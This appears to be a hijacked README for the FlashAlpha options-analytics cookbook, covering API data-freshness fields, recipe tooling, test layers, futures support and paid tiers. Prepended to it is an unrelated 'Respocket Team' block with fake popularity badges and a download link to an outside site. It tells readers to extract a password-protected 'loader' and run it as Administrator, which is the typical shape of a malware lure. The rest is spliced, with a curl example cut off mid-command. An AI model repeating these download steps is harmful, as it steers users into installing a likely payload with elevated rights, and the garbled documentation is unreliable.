<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Data provenance: `data_as_of`

Every FlashAlpha API response carries `data_as_of`, reporting when each upstream feed last
delivered to the node that answered, plus `endpoint_version` identifying the deployment
that produced it.

```json
"endpoint_version": "2026.08.25",
"data_as_of": {
  "node": "fa2",
  "equity_feed": "2026-08-25T18:48:58.204Z",
  "equity_options_feed": "2026-08-25T18:48:57.900Z",
  "index_feed": null,
  "index_options_feed": null,
  "futures_feed": null,
  "futures_options_feed": null,
  "flow_feed": "2026-08-25T18:48:55.100Z",
  "oi_feed": "2026-08-24T20:00:00.000Z",
  "macro_feed": "2026-08-25T18:45:00.000Z"
}
```

Spot and options are reported separately because they arrive over different pipes and fail
independently - an index chain can be current while the index level behind it is not, and
one timestamp cannot express that.

Read each feed against its **own cadence**, not against `as_of`. `oi_feed` at the previous
session's close is correct: settled open interest is published once per session, so on a
Monday the newest figure that exists is Friday's. An options feed an hour behind during
the regular session is not correct. A `null` means that node has not seen that feed, not
that it is broken.

The field evidences that a feed delivered recently. It does not assert that every contract
in a chain is equally current: an illiquid strike may not have quoted for hours while its
feed is healthy.

## Authoring a new recipe

```bash
python -m scripts.new_recipe \
  --slug 02-gamma-flip-cross-index \
  --title "Find Today's Gamma Flip Across Indexes" \
  --tier free \
  --tier-dir tier-a-hooks
```

This creates a paired `(.py, .ipynb)` skeleton with frontmatter, CTA cells,
and a starter code block. Fill in the body, run it once against live API
to record the cassette:

```bash
python -m scripts.record_cassettes notebooks/tier-a-hooks/02-gamma-flip-cross-index.ipynb
```

Then `pytest` will replay it from cassette on every PR.

## Test layers

| Layer | What it checks | When it runs |
|---|---|---|
| **0** Secrets | gitleaks + auth-header scrub + regex sweep over code & outputs | pre-commit + PR |
| **1** Structural | frontmatter schema, CTA UTMs, slug ↔ file, AST scan, link 200s | PR |
| **2** Execution | papermill + vcrpy cassette replay; runtime + call budgets | PR |
| **3** Golden | DataFrame & chart snapshots for backtest recipes | nightly (Phase 6+) |
| **4** Tier static | endpoints_used ⊆ tier (`endpoint_tiers.yaml`) | PR |
| **5** Funnel sanity | UTM rendering, link 200s, weekly stats | weekly (Phase 8) |

## Repository structure

- `notebooks/tier-{a,b,c,d,e,f,g}-*/` — recipes by tier
- `cookbook_tools/` — shared Python helpers (Pydantic schema, tier-map, CTA renderer)
- `scripts/` — CLI tools (`new_recipe.py`, `scrub_outputs.py`, `record_cassettes.py`, `sync_tier_map.py`)
- `tests/` — Layer 0/1/2/4 test suites + cassettes
- `endpoint_tiers.yaml` — mirror of API tier middleware (`scripts/sync_tier_map.py` to regenerate)
- `docs/superpowers/{specs,plans}/` — design + implementation docs

## What the API covers

Recipes can call the full FlashAlpha endpoint surface. Beyond the core exposure
analytics (`/v1/exposure/gex|dex|vex|chex|summary|levels|narrative`, max pain,
SVI surfaces, VRP, 0DTE exposure, and the live/recent/blocks flow feeds), recent
endpoint families include:

- **Strategy Signals** (`/v1/strategies/*`) — 10 systematic signals
  (flow-anomaly, expiry-positioning, zero-dte, dealer-regime, vol-carry,
  yield-enhancement, surface-anomaly, skew, term-structure, tail-pricing) behind
  one uniform decision envelope, for trade selection and signal backtesting.
## Futures (CME)

FlashAlpha serves the full options-analytics stack for **CME futures** across six complexes - equity index (`ES=F`, `NQ=F`, `RTY=F`, `YM=F`, `MES=F`, `MNQ=F`), metals (`GC=F` gold, `SI=F` silver), energy (`CL=F` crude oil, `NG=F` natural gas), the Treasury curve (`ZT=F`, `ZF=F`, `ZN=F`, `TN=F`, `ZB=F`, `UB=F`), grains (`ZC=F` corn, `ZS=F` soybeans, `ZW=F` wheat) and crypto (`BTC=F` bitcoin). Options-on-futures are priced with **Black-76** (forward-priced) and each root carries its own CME contract multiplier, so notionals and dollar gamma are in real dollars. Note the quote conventions: Treasuries are quoted in points of par and grains in cents, so their multipliers are the contract size divided by 100. Everything that works for an equity works for futures: gamma exposure (GEX), DEX, VEX, CHEX, key levels, max pain, the IV surface, exposure summary, narrative, and live flow.

```bash
# Gamma exposure for the E-mini S&P 500 future (note the %3D-encoded '=')
curl -H "X-Api-Key: $FLASHALPHA_API_KEY" \
## What the paid tiers unlock

The free tier covers single-expiry GEX on equities, key levels, the BSM Greeks/IV
calculator and stock quotes. Paid tiers add:

- **DEX, VEX (vanna) and CHEX (charm) exposure, plus max pain** — from the **Basic
  tier** ($79/mo), with ETF and index symbols.
- **Full-chain GEX, 0DTE and flow analytics** — from the **Growth tier** ($299/mo).
- **Point-in-time replay since 2017, SVI vol surfaces, VRP analytics, higher-order
  Greeks**, uncached and unlimited — the **Alpha tier** ($1,499/mo). FlashAlpha is one
  of the only public APIs publishing aggregate vanna and charm exposure across the
  full universe, with no look-ahead and no training-serving skew.

Built for quants, prop desks, and vol funds. See the full picture and get a key:


---

MIT License

Copyright (c) 2026 FlashAlpha

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
